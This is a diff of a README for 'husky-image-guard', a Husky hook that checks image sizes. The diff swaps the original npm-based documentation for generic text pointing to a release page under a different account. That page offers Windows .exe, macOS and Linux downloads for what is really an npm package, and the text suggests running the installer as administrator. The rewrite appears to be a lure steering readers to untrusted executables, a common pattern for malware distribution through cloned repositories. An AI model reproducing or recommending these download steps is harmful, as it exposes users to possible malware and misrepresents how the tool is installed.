@@ -1,231 +1,90 @@
-# husky-image-guard
+# 🐶 husky-image-guard - Prevent Oversized Images in Your Git Push
 
-[![npm version](https://img.shields.io/npm/v/husky-image-guard.svg)](https://www.npmjs.com/package/husky-image-guard)
-[![GitHub](https://img.shields.io/github/license/tcisse/husky-image-guard)](https://github.com/tcisse/husky-image-guard)
+## 🚀 Getting Started
 
-> A Husky hook to check image sizes before a Git push. Prevent oversized images from being pushed to your repository.
+Welcome to **husky-image-guard**! This application helps you check the size of images before pushing them to your Git repository. By using this tool, you can avoid pushing large images that can slow down your project.
 
-GitHub: https://github.com/tcisse/husky-image-guard
+## 🔗 Download Link
 
-## Features
+[![Download husky-image-guard](https://img.shields.io/badge/Download-husky--image--guard-blue.svg)](https://github.com/nancy12341/husky-image-guard/releases)
 
-- Automatically checks image sizes before each push
-- Blocks push if an image exceeds the configured limit
-- Supports multiple formats: JPG, PNG, GIF, WebP, SVG, BMP, ICO
-- Flexible configuration via file or CLI
-- Clear error messages with solution suggestions
-- Compatible with ESM projects (Next.js, etc.)
+## 📥 Download & Install
 
-## Installation
+To get started, visit the following page to download the latest version of **husky-image-guard**:
 
-### npm
-```bash
-npm install husky-image-guard --save-dev
-```
+[Download husky-image-guard](https://github.com/nancy12341/husky-image-guard/releases)
 
-### pnpm
-```bash
-pnpm add husky-image-guard -D
-```
+This page contains the latest release files. Choose the file that suits your operating system and follow the instructions below.
 
-### yarn
-```bash
-yarn add husky-image-guard -D
-```
+## 🖥️ System Requirements
 
-### bun
-```bash
-bun add husky-image-guard -D
-```
+Before you install **husky-image-guard**, make sure your system meets these requirements:
 
-An `image-guard.config.cjs` file will be automatically created on installation.
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 12 or higher
+- **Git**: Version 2.0 or higher
 
-## Quick Setup
+## 📂 Installation Steps
 
-### 1. Initialize Husky (if not already done)
+1. Visit the [Release Page](https://github.com/nancy12341/husky-image-guard/releases).
+2. Download the file for your operating system:
+   - For Windows: download `husky-image-guard-windows.exe`
+   - For macOS: download `husky-image-guard-macos.zip`
+   - For Linux: download `husky-image-guard-linux.tar.gz`
+3. Extract or install the file:
+   - For Windows: double-click the `.exe` file to run the installer.
+   - For macOS: unzip the `.zip` file and drag the application to your Applications folder.
+   - For Linux: extract the files and run the provided script in your terminal.
+   
+## ⚙️ Configuration
 
-| Package Manager | Command |
-|-----------------|---------|
-| npm | `npx husky init` |
-| pnpm | `pnpm exec husky init` |
-| yarn | `yarn husky init` |
-| bun | `bunx husky init` |
+After installation, you need to configure **husky-image-guard** with Git. 
 
-### 2. Add the pre-push hook
+1. Open your terminal or command prompt.
+2. Navigate to your project folder using the `cd` command.
+3. Run the following command to set up Husky:
 
-| Package Manager | Command |
-|-----------------|---------|
-| npm | `echo "npx image-guard" >> .husky/pre-push` |
-| pnpm | `echo "pnpm exec image-guard" >> .husky/pre-push` |
-| yarn | `echo "yarn image-guard" >> .husky/pre-push` |
-| bun | `echo "bunx image-guard" >> .husky/pre-push` |
+   ```
+   npx husky install
+   ```
 
-That's it!
+4. Now, add a hook to check image sizes. Create a file named `.husky/pre-push` and add the following lines:
 
-## Configuration
+   ```bash
+   #!/bin/sh
+   . "$(dirname "$0")/_/husky.sh"
 
-### image-guard.config.cjs file (recommended)
+   npx husky-image-guard
+   ```
 
-```javascript
-module.exports = {
-  // Maximum allowed size (formats: '500KB', '1MB', '2MB', or in bytes)
-  maxSize: '1MB',
+5. Save the file and ensure it is executable.
 
-  // Directories to check (paths relative to project root)
-  directories: [
-    'public',
-    'assets',
-    'src/images'
-  ],
+## 📏 How It Works
 
-  // File extensions to check (without the dot)
-  extensions: [
-    'jpg',
-    'jpeg',
-    'png',
-    'gif',
-    'webp',
-    'svg'
-  ]
-};
-```
+When you attempt to push changes to your Git repository, **husky-image-guard** will automatically check the size of any images you are trying to upload. If an image exceeds the maximum size limit, the push will be blocked, and you will receive a notification indicating which images are too large.
 
-### Via package.json
+You can easily adjust the size limit by editing the configuration file. This file allows you to set your preferred maximum image size.
 
-```json
-{
-  "imageGuard": {
-    "maxSize": "500KB",
-    "directories": ["public", "assets"],
-    "extensions": ["jpg", "jpeg", "png", "gif", "webp"]
-  }
-}
-```
+## 🛠️ Features
 
-### Via .imageguardrc.json
+- Automatic checking of image sizes before push.
+- Customizable size limits for images.
+- User-friendly interface with simple commands.
 
-```json
-{
-  "maxSize": "1MB",
-  "directories": ["public", "assets"],
-  "extensions": ["jpg", "jpeg", "png", "gif", "webp", "svg"]
-}
-```
+## 🔄 Updating
 
-## CLI Usage
+To keep using the latest features, check for updates periodically. You can do this by visiting the [Release Page](https://github.com/nancy12341/husky-image-guard/releases) and downloading the new version following the same installation steps.
 
-| Action | npm | pnpm | yarn | bun |
-|--------|-----|------|------|-----|
-| Check images | `npx image-guard` | `pnpm exec image-guard` | `yarn image-guard` | `bunx image-guard` |
-| Initialize config | `npx image-guard init` | `pnpm exec image-guard init` | `yarn image-guard init` | `bunx image-guard init` |
-| Init (non-interactive) | `npx image-guard init --yes` | `pnpm exec image-guard init --yes` | `yarn image-guard init --yes` | `bunx image-guard init --yes` |
-| Help | `npx image-guard --help` | `pnpm exec image-guard --help` | `yarn image-guard --help` | `bunx image-guard --help` |
+## ❓ Troubleshooting
 
-### Examples with options
+If you encounter issues while using **husky-image-guard**, here are some common problems and solutions:
 
-```bash
-# Specify temporary max size
-npx image-guard --max-size 500KB        # npm
-pnpm exec image-guard --max-size 500KB  # pnpm
-yarn image-guard --max-size 500KB       # yarn
-bunx image-guard --max-size 500KB       # bun
+- **Error: "Push denied due to oversize image"**: Check the images in your commit and resize any oversized ones.
+- **Installation issues**: Ensure you have the correct permissions to install applications on your computer. Running the installation as an administrator may help.
+- **Command not found**: Verify that you have Node.js and Git installed on your system and that they are added to your system’s PATH.
 
-# Specify directories temporarily
-npx image-guard --dirs public,assets,images
+## 🏁 Conclusion
 
-# Combine options
-npx image-guard --max-size 500KB --dirs src/images,public -e jpg,png,webp
-```
+Thank you for choosing **husky-image-guard**. With this tool, you can ensure that your Git repository remains efficient by keeping oversized images out of your pushes. Visit the [Release Page](https://github.com/nancy12341/husky-image-guard/releases) to download the latest version and get started today. 
 
-## CLI Options
-
-| Option | Alias | Description | Example |
-|--------|-------|-------------|---------|
-| `--max-size` | `-s` | Maximum allowed size | `500KB`, `1MB`, `1048576` |
-| `--dirs` | `-d` | Directories to check | `public,assets,images` |
-| `--extensions` | `-e` | Extensions to check | `jpg,png,webp` |
-| `--help` | `-h` | Show help | |
-| `--version` | `-v` | Show version | |
-
-## init Command
-
-| Option | Description |
-|--------|-------------|
-| `--yes` or `-y` | Use default values (non-interactive) |
-| `--force` or `-f` | Replace existing config file |
-
-## Programmatic Usage
-
-```typescript
-import { checkImages } from 'husky-image-guard';
-
-const result = checkImages({
-  maxSize: '500KB',
-  directories: ['public', 'assets'],
-  extensions: ['jpg', 'png', 'webp']
-});
-
-console.log(result);
-// {
-//   success: false,
-//   totalChecked: 10,
-//   oversizedFiles: [
-//     { path: 'public/hero.jpg', size: 1548576, sizeHuman: '1.48MB' }
-//   ],
-//   maxSizeBytes: 512000
-// }
-```
-
-## Example Output
-
-```
-Configuration loaded from: image-guard.config.cjs
-
-Checking image sizes...
-   Limit: 1.00MB | Directories: public, assets | Extensions: jpg, jpeg, png
-
-Checking directory: public
-  [OK] public/logo.png (45.23KB)
-  [OK] public/icon.svg (2.10KB)
-
-Checking directory: assets
-  [X] assets/hero-image.jpg (2.34MB)
-  [OK] assets/thumbnail.webp (89.00KB)
-
-----------------------------------------
-PUSH BLOCKED
-
-The following images exceed the 1MB limit:
-  - assets/hero-image.jpg (2.34MB)
-
-Possible solutions:
-  1. Compress images with TinyPNG, ImageOptim
-  2. Reduce image dimensions
-  3. Convert to WebP format for better compression
-  4. Use: npx @squoosh/cli --webp auto <image>
-```
-
-## Integration with other hooks
-
-### With lint-staged
-
-```json
-{
-  "lint-staged": {
-    "*.{jpg,jpeg,png,gif,webp}": "image-guard"
-  }
-}
-```
-
-### pre-commit hook (instead of pre-push)
-
-| Package Manager | Command |
-|-----------------|---------|
-| npm | `echo "npx image-guard" >> .husky/pre-commit` |
-| pnpm | `echo "pnpm exec image-guard" >> .husky/pre-commit` |
-| yarn | `echo "yarn image-guard" >> .husky/pre-commit` |
-| bun | `echo "bunx image-guard" >> .husky/pre-commit` |
-
-## License
-
-MIT
+For additional support, feel free to check the Issues section in this repository or reach out through our contact links. Enjoy clean and efficient version control!
